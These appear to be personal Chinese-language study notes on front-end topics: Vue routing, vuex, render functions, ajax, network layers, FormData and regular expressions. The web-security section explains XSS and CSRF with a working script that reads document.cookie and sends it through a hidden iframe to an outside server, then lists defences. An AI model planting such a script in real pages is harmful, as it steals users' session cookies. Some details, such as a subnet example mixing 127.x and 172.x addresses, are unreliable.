1. 动态添加路由配置：
 (1).vm.$router.addRoutes() 
	页面load（刷新）进来会执行所有配置页面，在vur-router 切换页面的时候不会重载配置文件，包括router配置文件。
	如果想动态配置路由这时候就用到了addRoutes方法，但是该方法没有撤回或者覆盖，多次addRoutes同一个path，只有第一次添加的有效，
	所以该方法于最新vue-router@2.2.0版本无法动态配置路由文件。
 (2).登录接口必定会返回权限的数据，针对登录token、账户信息及权限配置我们习惯性的放置在cookie里。
	所以在vue-router 配置文件里可以依赖权限cookie动态改变路由配置。前提是在登录成功后使用location.href方法跳转而非vue-router跳转，具体原因请参考方法一。

2. vm.$nextTick()
 Vue.nextTick(callback)：当数据发生变化，更新后执行回调。
 Vue.$nextTick(callback)：当dom发生变化，更新后执行的回调。使用该方法可以获取真正的DOM节点。

3. vuex modules
	modules: {
	  foo: {
		namespaced: true,

		getters: {
		  // 在这个模块的 getter 中，`getters` 被局部化了
		  // 你可以使用 getter 的第四个参数来调用 `rootGetters`
		  someGetter (state, getters, rootState, rootGetters) {
			getters.someOtherGetter // -> 'foo/someOtherGetter'
			rootGetters.someOtherGetter // -> 'someOtherGetter'
		  },
		  someOtherGetter: state => { ... }
		},
		actions: {
			someAction ({ state, dispatch, commit, getters, rootState , rootGetters }, payload) {
				getters.someGetter // -> 'foo/someGetter'(访问当前模块的getters)
				rootGetters.someGetter // -> 'someGetter'(访问全局的getters)

				dispatch('someOtherAction') // -> 'foo/someOtherAction'(访问当前模块的action)
				dispatch('someOtherAction', null, { root: true }) // -> 'someOtherAction'(访问全局的action)
				dispatch('otherModule/someOtherAction', {}, { root: true }) // -> 'otherModule/someOtherAction' (访问其他模块的action)
				
				commit('someMutation') // -> 'foo/someMutation'(访问当前模块的mutation)
				commit('someMutation', {}, { root: true }) // -> 'someMutation'(访问全局的mutation)
				commit('otherModule/someMutation', {}, { root: true }) // -> 'someMutation'(访问其他模块的mutation)
			},
			someOtherAction (ctx, payload) { ... },
		}
	  }
	}
	
	computed: {
	  ...mapState({
		a: state => state.some.nested.module.a,
		b: state => state.some.nested.module.b
	  }),
	
	  ...mapState('some/nested/module', {
		a: state => state.a,
		b: state => state.b
	  })
	},
	methods: {
	  ...mapActions([
		'some/nested/module/foo',
		'some/nested/module/bar'
	  ]),
	  ...mapActions('some/nested/module', [
		'foo',
		'bar'
	  ]),
	}

4.ajax 
	1).请求返回的数据类型有三种：html/json/xml (requestText/responseXML)
	2).post上传数据类型 						request/Content-Type
	   空/对象/数组								application/json;charset=UTF-8
	   其他(字符串)	 							application/x-www-form-urlencoded(form)
	3).表单提交类型(EncType)					上传数据格式（窗体数据编码格式）
		application/x-www-form-urlencoded		名称/值对
		text/plain								纯文本
		multipart/form-data						一条消息，每个input对应消息中的一个部分，用于文件上传
												浏览器会把整个表单以控件为单位分割，并为每个部分加上Content-Disposition(form-data或者file),
												Content-Type(默认为text/plain),name(控件name)等信息，并加上分割符(boundary)。
												
												
5. 	vue 中的渲染函数render： createElement(tag, {}, []/String)
		参数1：标签名
		参数2：数据对象：
			{
				class: { //和‘v-bind:class’一样的API
					foo: true,
					bar: false,
				},
				style: { //和'v-bind:style'一样的 API
					color: 'red',
					fontSize: '14px',
				},
				attrs: { // 正常的 HTML 特性
					id: 'foo',
					class: 'bar',
				},
				props: { // 组件 props
					myProp: 'bar',
				},
				domProps: { // DOM 属性
					innerHTML: 'baz'
				},
				on: { // 事件监听器基于 "on",所以不再支持如 v-on:keyup.enter 修饰器,需要手动匹配 keyCode。
					click: this.clickHandler,
					'!click': this.clickHandler, // '!':.captrue(捕获模式)
					'~click': this.clickHandler, // '~':.once(监听一次)
					'~!click': this.clickHandler, // '~':.once.captrue(捕获模式监听一次)
					click: (e) => { // .stop
						e.stopPropagation();
					},
					click: (e) => { // .prevent
						e.preventDefault();
					},
					click: (e) => { // .self
						if (e.target !== e.currentTarget) return;
					},
					click: (e) => { // .enter
						if (e.keyCode !== 13) return;
					},
					click: (e) => { // .ctrl
						if (!e.ctrlKey) return;
					},
					'on-change': (e) => {

					}
				},
				nativeOn: { // 仅对于组件，用于监听原生事件，而不是组件使用 vm.$emit 触发的事件。
					click: this.nativeClickHandler
				},
				slot: 'name-of-slot',  // 如果子组件有定义 slot 的名称
				scopedSlots: { // 作用域插槽格式
					default: props = > createElement('span', props.text)
				},
				directives: [],  // 自定义指令. 注意事项：不能对绑定的旧值设值.Vue 会为您持续追踨
			}
		参数3: 子节点
			
	vue 中运用JSX：
		<div
		id="foo"
		domPropsInnerHTML="bar"
		onClick={this.clickHandler}
		onOn-Click={this.clickHandler}
		nativeOnClick={this.nativeClickHandler}
		class={{foo: true, bar: false}}
		style={{color: 'red', fontSize: '14px'}}
		ref="key"
		key="key"
		slot="slot">

	iview table render 用法总结：
		1). attrs 设置html标签属性有效，对于iview组件无效。 譬如给Poptip组件加class 会破坏组件的class 
		2). props 设置v-model/vModel无效 但可以用value代替。
			props: ['value'],
			render: function(createElement){
				let self = this;
				return createElement('input',{
					domProps: {
						value: self.value,
					},
					on: {
						input:function(event){
							self.$emit('input', event.target.value);
						},
					},
				})
			},
		3). on 设置事件无法加事件修饰符。如‘click.self’是无效的

6. addEventListener
	el.addEventListener('click', func, false) -- 冒泡
	el.addEventListener('click', func, true) -- 捕获
	el.removeEventListener('click', func, true) -- 解除绑定的事件监听（必须把func提出来以函数传入才可以解除该监听）
	注: 2015年DOM 规范做了修订 第三个参数可以是对象，目前对象可有的属性有三个：
	addEventListener(type,listener,{
		captrue: false, // 是否捕获
		passive: false,	// 是否passive（针对移动端滚动页面或缩放页面）
		once：false, // 是否一次性监听
	})
	
7.vue
	1).computed在没有设置setter时是不能修改computed的
		computed:{
			aplus: {
				get: function(){
					return this.a + 1;
				},
				set: function(v){
					this.a = v - 1; // computed的依赖变化才会引起它的变化
				}
			}
		}
	2).watch监听 （vm.$watch）
		watch: {
			a: function(val. oldVal){}, // 只能监听到非对象数据
			b: 'someMethod', //方法名
			c: { // 深层监听对象（开销大，对象里任何属性的修改都会触发handler）
				handler: function(val, oldVal){},
				deep: true,
			},
			d: { // 立即执行handler
			  handler: function (val, oldVal) { /* ... */ },
			  immediate: true
			},
			e: [ // 多个回调
				function handler1(val, oldVal){},
				function handler2(val, oldVal){},
			],
			'e.f': function(val. oldVal){}, // 监听e对象的f
		}
	3).v-model在组件中使用：
		v-model是一个语法糖，用于父组件获取子组件的值。
		在组件中使用： <someCom v-model="visible"></someCom> => <someCom :value="visible" @input="visible = $event"></someCom>
		父组件：如果visible是computed，而要对visible进行双向绑定，那就必须给visible设置setter。
		子组件：必须在props中声明value。而props中的属性是不能够修改的，所以要在data中定义一个变量接收value，用以改变传进来的value。watch里监听data值来触发组件的input事件，用以传递给父组件值。
										或者在computed定义该变量，但要对其设置seter
			例：props: {
					value: {
						type: Number,
						default: 0,
					},
				},
				computed: {
					scoreValue: {
						get() {
						  return this.value;
						},
						set(val) {
						  this.$emit('input', val);
						},
					},
				}
				// 或者
				data() {
					return {
						scoreValue: this.value,
					};
				},
				watch: {
					value: {
						immediate: true,
						handler(val) {
							this.scoreValue = val;
						},
					},
					scoreValue(val) {
						this.$emit('input', val); // 改变双向绑定的变量的值
					},
				},
	4). sync修饰符(和v-model异曲同工之妙)：
			<comp :foo.sync="bar"></comp> ==> <comp :foo="bar" @update:foo="val => bar = val"></comp>
			this.$emit('update:foo', 'hahahah');


8.scoped
	1).给HTML的DOM节点加一个不重复的data属性（形如：data-v-19fca230）来表示唯一性。
	2).在每句css选择器的末尾（编译后生成的css语句）加一个当前组件的data属性选择器（形如：[data-v-19fca230]）来私有化样式
	3).如果组件内部包含其他组件，只会给其他组件的最外层标签嘉上当前组件的data属性
	解决样式全局污染的问题：
		写两个<style> 封闭样式写在scoped标识的style中，覆盖样式写在非scoped标识的style中。
		
9.data-* 自定义属性 （尽管'data-*'是HTML5才出现的属性，但jquery是通用的，所以在非HTML5的浏览器里，任然可以使用.data(obj)方法来操作'data-*'数据）
	1).添加或者读取自定义属性时需要去掉前缀'data-';
	2).如果属性名称中包含连字符（-），需要装成驼峰式命名；但在css中使用选择器需要使用连字符格式。
	<div data-my-name="aha" data-cardCd="24"></div>
	<div id="awesome-json" data-awesome='{"game":"on"}'></div>
	js赋值取值：el.dataset.myName = 'aha'/el.setAttribute('data-my-name'， 'aha'); console.log(el.dataset.myName)/console.log(el.getAttribute('data-my-name'));
				console.log(el.dataset.cardcd) //不管是不是驼峰式都小写
	jq赋值取值：$(el).data('myName', 'aha'); console.log($(el).data('myName'));
				console.log($(el).data('cardcd')) //不管是不是驼峰式都小写		
	
10. 网络协议原理
	OS:操作系统(operating System),是管理和控制计算机硬件与软件资源的计算机程序，是直接运行在‘裸机’上的
		最基本的系统软件，任何其他软件都要在操作系统的支持下才能运行。计算机（硬件）-> os -> 应用软件
	互联网的本质就是一系列的协议，总称为‘互联网协议’（Internet Protocol Suite）
	OSI:开放式系统互联(Open System Interconnection)
	ARP:正向地址解析协议，通过抑制IP寻找对应主机的MAC地址。
	RARP：反向地址解析协议，通过MAC地址确定IP地址。
	TCP/IP四层 ： 应用层  						传输层(TCP)(又称主机到主机层)			 网络层(IP)(又称互联层)				网络接口层(又称链路层)
	TCP/IP五层 ： 应用层  						传输层(TCP)(又称主机到主机层)			 网络层(IP)(又称互联层)				数据链路层 + 物理层
	OSI七层 ： 	  应用层 + 表示层 + 会话层  	 传输层(TCP)(又称主机到主机层)			 网络层(IP)(又称互联层)				数据链路层 + 物理层	
	用户感受到的只是最上一层应用层，自上而下每层都依赖于下一层。每层都运行特定的协议，越往上越靠近用户，越往下月靠近硬件。
	
	物理层：以二进制数据形式在物理媒体上传输数据
			由来：孤立的计算机之间要想一起玩，就必须介入internet，言外之意就是计算机之间必须完成组网。
			功能：主要是基于电器特性发送高低电压(电信号)，高电压对应数字1，低电压对应数字0.
	数据链路层： 传输有你地址的帧以及错误检测功能
			由来：单纯的点信号0和1没有任何意义，必须规定电信号多少位一组，每组什么意思（以太网协议：ethernet）
			功能：定义了电信号的分组方式
			ethernet规定：一组电信号构成一个数据包，叫做‘帧’。每一帧数据分成报头head和数据data两部分。
							head（固定18个字节）包含发送者/源地址（6个字节），接受者/目标地址（6个字节），数据类型（6个字节）
							data（最短46字节最长1500字节）包含数据包的具体内容。
							head长度 + data长度 = 最短64字节，最长1518字节，超过最大限制就分片发送。
			mac地址：每块网卡出厂时都会被制上一个世界唯一的mac地址，长度为48位2进制，通常有12位16进制数表示（前六位是厂商编号，后六位是流水线号）
			广播：有了mac地址，同一网络内的两台主机就可以通信了（一台主机通过arp协议获取另一台主机的mac地址）。ethernet采用最原始的方式，广播的方式通信，即计算机通信基本靠吼。
	网络层：为数据包选择路由。
			由来：由来ethernet/mac地址/广播的发送方式，世界上的计算机就可以彼此通信了，问题是世界范围的互联网是由一个个彼此隔离的效=小的局域网组成的，呢么如果所有的通信都采用以太网的广播方式，呢么一台机器发送的包全世界都会收到，
					这就不仅仅失效率低的问题了，这会是一种灾难。必须找到一种方法来区分哪些计算机属于同一广播域，哪些不是，如果是就采用广播的方式发送，如果不是就采用路由非凡是（向不同广播域/子网分发数据包），mac地址无法区分，他只跟厂商有关。
			功能：引入一套新的地址用来区分不同的广播域/子网，这套地址即!!网络地址!!。
			IP协议：规定网络地址的协议叫IP协议，他定义的地址称之为IP地址，广泛采用的v4版本即ipv4，他规定网络地址有32位2进制表示，范围0.0.0.0-255.255.255.255。
					作用：1.为每一台计算机分配IP地址，2.确定哪些地址处于同一个子网络。
			IP地址：分成网络部分（标识子网）和主机部分（标识主机）两部分。单纯的IP地址只是标识了 IP地址的种类，从网络部分或主机部分都无法识别一个ip所在的子网，例如：127.16.10.1与127.16.10.2并不能确定二者处于同一子网。
			子网掩码： 表示子网络特征的一个参数。形式上等同于IP地址，也是一个32位二进制数字，他的网络部分全部为1，主机部分全部为0。
						知道子网掩码就可以判断，任意两个IP是否处于同一个子网络。方法就是将IP地址与子网掩码‘位与’运算。例如：子网掩码都是255.255.255.0的两个IP地址分别为
						127.16.10.1 和 127.16.10.2是否是处于哦同一个子网络：
						127.16.10.1 ： 10101100.00010000.00001010.00000001
						255.255.255.0：11111111.11111111.11111111.00000000
						AND运算结果：  10101100.00010000.00001010.00000000 ： 172.16.10.0
						
						127.16.10.2 ： 10101100.00010000.00001010.00000010
						255.255.255.0：11111111.11111111.11111111.00000000
						AND运算结果：  10101100.00010000.00001010.00000000 ： 172.16.10.0
						结果都一样，所以两个IP地址处于同一个子网络。
			IP数据包：页包含head(20-60字节)与data(最长65535字节)两部分，无需为IP包定义单独的栏位，直接放进以太网包的data部分。
						而以太网数据data部分最长只有1500字节，因此，如果IP数据包超过了1500字节，他就需要分割成几个以太网数据包，分开发送。
						------------------------------------------------------------
						|以太网头        |	ip头     |		ip数据                 |
						------------------------------------------------------------
	传输层：用一个寻址机制标识一个特定的应用程序（端口号）。
			由来：网络层的ip帮我们区分子网，以太网的mac帮我们找到主机，然后大家使用都是应用程序，你的电脑上同时开启qq、暴风影音、等多个应用程序，那么我们
				通过ip和mac找到一台特定主机，如何标识这台主机的应用程序，答案就是端口，端口即应用程序与网卡关联的编号。
			功能：建立端口对端口的通信。
			补充：端口范围0-65535,0-1023为系统占用端口。
			tcp协议：可靠传输，tcp数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常tcp数据包的长度不会超过ip数据包的长度，以保证单个tcp数据包不在分割。
					---------------------------------------------------------------------
					|以太网头        |	ip头     |	tcp头	|		数据                 |
					---------------------------------------------------------------------
			udp协议： 不可靠传输，‘报头’部分一共只有八个字节，总长度不超过65535字节，正好放进一个IP数据包。
					---------------------------------------------------------------------
					|以太网头        |	ip头     |	udp头	|		数据                 |
					---------------------------------------------------------------------
	应用层： 网络服务与使用者应用程序间的一个接口。
			由来：用户使用的都是应用程序，均工作于应用层，互联网开发的，大家都可以开发自己的应用程序，数据多种多样，必须规定好数据的组织形式。
			功能：规定用用程序与的数据格式。
			例：tcp协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序就构成了‘应用层’。
			
11. HTML性能优化。
12. web安全及网络攻击：
		XSS：跨站脚本攻击（Cross-Site Scripting）。顾名思义，就是通过向网站写入js脚本来实现攻击。
		CSRF：跨站点伪造请求（Cross-Site Request Forgery）。该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，
			从而在未授权的情况下执行权限保护之下的操作，具有很大的危害性。
			XSS是实现CSRF的诸多途径中的一条，一般习惯上把通过XSS来实现的CSRF称为XSRF。
			例：发帖子
				1). 帖子内容为：
					while(true) {
						alert('你关不掉我');
					}
					当用户访问我的帖子时，用户的所有操作都由我这串代码掌握。这就是最原始的脚本注入。
				2). 帖子内容为：
					// 用 <script type="text/javascript"></script> 包起来放在评论中
					(function(window, document) {
						// 构造泄露信息用的 URL
						var cookies = document.cookie;
						var xssURIBase = "http://192.168.123.123/myxss/";
						var xssURI = xssURIBase + window.encodeURI(cookies);
						// 建立隐藏 iframe 用于通讯
						var hideFrame = document.createElement("iframe");
						hideFrame.height = 0;
						hideFrame.width = 0;
						hideFrame.style.display = "none";
						hideFrame.src = xssURI;
						// 开工
						document.body.appendChild(hideFrame);
					})(window, document);
					当用户访问该帖子时，就会把用户的cookie信息传输到http://192.168.123.123/myxss/这段服务器，
					然后服务器的代码就可以接收到了用户的隐私信息，继而继续做其他的业务处理。
					但是这仅仅是XSS，并没有发生CSRF，因为仅仅盗取了用户信息，并没有“伪造”用户发起一些请求。
					如果192.168.123.123/myxss/index.php 写的代码是将当前用户的昵称改为“我是大笨猪”，
					那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。
		
		防御手段： 1). 规范请求类型：任何资源操作都不能用get。
				  2). 检查referer：即检查请求头的来源网站，从而保证此次请求来源于信任的网站。
				  3). 设置请求Token：当访问页面时，服务端会在页面写入一个随机token值，并设置token生命周期。之后我的请求就必须带上此次token值，
						  请求过的token就会失败，无法再用。更加安全性的页面，如登录页面，应该加验证码。
				  4). 防住第一道防线-XSS：再次强调，如果cookie被别人拿走了，任何防御都将在理论上失效。上述的防御手段仅仅是提高攻击门槛。
				  		有了你的cookie，我可以直接请求你的页面，获取你的token，获取你的验证码图片并解析出来，然后在发起请求。而服务器还以为这是你本人。
						
13. vue functional函数式组件：无状态（没有响应式数据）、无实例（没有this上下文）
		props:vue@2.3.0中必须接受props，之后的版本可以省略该选项，组件上所有的特性都会被解析成props。
		children： VNode子节点数组
		slots： 返回所有插槽的对象的函数
		scopedSlots:  一个暴露传入的作用域插槽的对象。也以函数形式暴露普通插槽
		data: 传递给组件的data对象,作为 createElement 的第二个参数传入组件
		parent： 对父组件的引用
		listeners: (2.3.0+) 一个包含了组件上所注册的 v-on 侦听器的对象。这只是一个指向 data.on 的别名。
		
14. vue渲染机制：
	el -> template ---(compileToFunction)-->  render  ---(vm._render)--> vnode ---(vm._update)--> vm.$el
	独立构建与运行时构建：区别在于前者包含模板编译器而后者没有
		独立构建：html字符串 -> render函数 -> vnode -> 真实dom节点
		运行时构建： render函数 -> vnode -> 真实dom节点
		
15. keep-live:使得组件不被销毁，存于缓存中，再次进入该组件时不刷新，不走mounted。相应的钩子函数是activated代替mounted、deactivated代替destroyed

16. FormData: 为序列化表以及创建与表单格式相同的数据提供便利。
		创建方式：
			1.var formData = new FormData(); 然后调用append()方法添加数据
			2.var formEle = document.getElementById('form1');
			  var formData = new FormData(formEle); 
			  如果需要添加其他组件可以调用append()方法添加数据
		获取值：get(key)/getAll(key)
		设置值：append(key, value)/set(key, value)
			append:添加一个组件，只包含一个值
			set：如果组件中已经存在该key，则修改该key的值；如果不存在则新增一个组件，其值为数组。
		删除值：delete(key)
		判断是否有该数据：has(key)
		遍历：forEach()/entries()
		兼容性：
			1.只有火狐浏览器支持全部api，其他浏览器只有append的api
			2.jQuery提交ajax时 processData设置为false（不需要对数据做处理）
			3.jQuery提交ajax时 cache设置为false（上传文件不需要缓存）
			4.jQuery提交ajax时 contentType设置为false（已经声明了是‘FormData’对象）
			
17. XMLHttpRequest：ajax对象
		abort: 断开连接
		onabort: 断开连接回调
		onerror: 失败回调
		onload: 连接回调
		onreadystatechange: 连接回调
		onprogress: 连接进程回调
		withCredentials: 是否使用类似cookies,authorization headers(头部授权)或者TLS客户端证书这一类资格证书来创建一个跨站点访问控制（cross-site Access-Control）请求。
		upload:  XMLHttpRequestUpload
			onabort：断开回调
			onload： 连接回调
			onprogress：连接进程回调
			onerror：失败回调
		运用upload的onprogress(e)的e.loaded和e.total可实现上传进度。

18. a标签的download属性：href可以指向本地的静态文件，download设置下载后的文件名。如果要带后缀名下载的文件就是该文件，如果没有就是文件原格式。

19. 保留小数点后两位：
		1). num_string.substring(0,num_string.indexOf(".")+3) // 字符串截取
		2). parseFloat(num).toFixed(3).slice(0,-1) // 最好用，小数点保留两位，截取非四舍五入，
		3). num_string.replace(/([0-9]+\.[0-9]{2})[0-9]*/,"$1"); // 字符串截取
		4). Math.round(num*100)/100 // 小数点最多保留两位，四舍五入
		5). num.toFixed(2) // 小数点保留两位，四舍五入

20.flex布局会把伪元素当做元素来分配空间，但我们一般希望伪元素只有装饰作用，不影响布局，这与我们预期不一致。
	所以，当flex布局中有伪元素时要特别小心。解决方案是：给伪元素绝对定位（position:absolute/fixed）

21.keep-alive的组件进来后data不会时初始状态，若想初始化data可以用一下方法：
	Object.assign(this.$data, this.$options.data.call(this))

22.正则匹配
	I.括号的区别与应用:
		():圆括号()是组，主要应用在限制多选结构的范围/分组/捕获文本/环视/特殊模式处理
			例子:
			1.(abc|bcd|cde),表示这一段是abc、bcd、cde三者之一，顺序也必须一致。
					const reg = /(abc|bcd|cde)/gi;
					const str = 'jksagdhjgcyaabcde'
					console.log(str.match(reg)) // ['abc']
			2.(abc)? 表示这一组要么一起出现，要么不出现，出现则按顺序出现
					const reg = /(abc)?rr/gi;
					const str = 'jksagdhjgcyarrcde'
					console.log(str.match(reg)) // ['rr']
			3.(?:abc)表示找到一样abc的一组，但是不记录，不保存到变量中，否则可以通过x取第几个括号所匹到的项
					const reg = /(aaa)(bbb)(ccc)(?:ddd)(eee)/gi;
					const str = 'aaabbbcccdddeee123'
					const test = reg.test(str)
					const res = str.replace(reg, '$1 $2 $3 $4 ')
					console.log(test)
					console.log(res) // 'aaa bbb ccc eee 123'
					$4表示的不是ddd而是eee，因为ddd不保存在变量中
			4.a(?=bbb)顺序环视 表示a后面必须紧跟3个连续的b
					const reg = /a(?=bbb)/gi;
					const str = 'aaabbbcccdddeee123'
					const test = reg.test(str)
					const res = str.match(reg)
					console.log(test)
					console.log(res) // ['a']
		[]字符类:方括号是单个匹配 字符集/排除字符集/命名字符集
			1.[0-3]表示找到一个位置上的字符只能是0-3的四个数字
					const reg = /^[1-9]/gi;
					const str = '122'
					const test = reg.test(str)
					console.log(test)
			2.[^0-3]表示找到这个位置上字符只能是除了0到3之外的所有字符
					const reg = /[^0-3]/gi;
					const str = '422'
					const test = reg.test(str)
					console.log(test)
			3.
					const reg = /[b(ab)]/gi;
					const str = 'b(a)啊实打实的'
					const test = reg.test(str)
					const exec = reg.exec(str)
					const match = str.match(reg)
					console.log(test)
					console.log(exec)
					console.log(match)
			
		{}:一般是用来匹配的长度.(0-9)匹配'0-9'本身。[0-9]*匹配数字（注意后面有*，可以为空）[0-9]+匹配数字(注意后面有+，不可以为空)
		
	字符类：正则表达式字符类使用中括号[]定义。字符类有"字符"+"类"构成，字符很容易理解，比如字母或者数字等都是字符。类可以理解为某些共同特点，比如说人类、哺乳类等
		1.字符类基本应用：
			字符类可以匹配他所包含的任意一个字符，也就是说只要字符串中包含任意一个字符类的字符，那么就可以完成匹配。
			特表说明: 字符类的字符是以字符为单位进行匹配的，不能是字符的组合。
			let str="softwhy.com";
			let one=/[ft]/g;
			let two=/ft/g;
			console.log(str.match(one)); // [ 'f', 't' ]
			console.log(str.match(two)); // [ 'ft' ]
		2.反字符类：中括号以^起始可以构成一个反字符类。
			反字符类匹配除去中括号内所有字符外的任意一个字符。
			let str="an6t888";
			let reg=/[^0123456789]/g; // 匹配非数字字符
			console.log(str.match(reg)); // [ 'a', 'n', 't' ]
		3.定义字符类或者反字符类范围：所谓字符类范围（或者反字符类范围）就是指定起始与结尾字符，中间使用横线连接
			let str="www.softawhy.com";
			let reg=/[h-wab]/g; // 匹配h到w和a、b字符
			console.log(str.match(reg)); // [ 'w', 'w', 'w', 's', 'o', 't', 'a', 'w', 'h', 'o', 'm' ]
		4.预定义字符类：
			.: 匹配任意字符(除了回车符'\r'和换行符'\n')
			\w: 匹配字母数字。等价于[a-zA-Z0-9]
			\W: 匹配非字母数字。等价于[^a-zA-Z0-9]
			\d: 匹配数字。等价于[0-9]
			\D: 匹配非数字。等价于[^0-9]
			\s: 匹配空白符，包括空格符、制表符、回车符、换行符、垂直换行符和换页符。
				let str="蚂蚁部落 \n http://www.softwhy.com"; 
				let reg=new RegExp("\\s","g"); 
				console.log(str.match(reg)); // [ ' ', '\n', ' ' ]
				console.log(str.replace(reg, '')) // 蚂蚁部落http://www.softwhy.com
			\S: 匹配非空白符
	const reg = /<p>((?!img).)*<[/]p>/gi
	var str = '<p><p> 我是纯文本<br> </p><strong></strong><img src="http://api-uat.kyeapi.com/router/download/iaams_baike_answer/14/507dd4691df743859b78295ad227d63f"></p>'
	str.match(reg)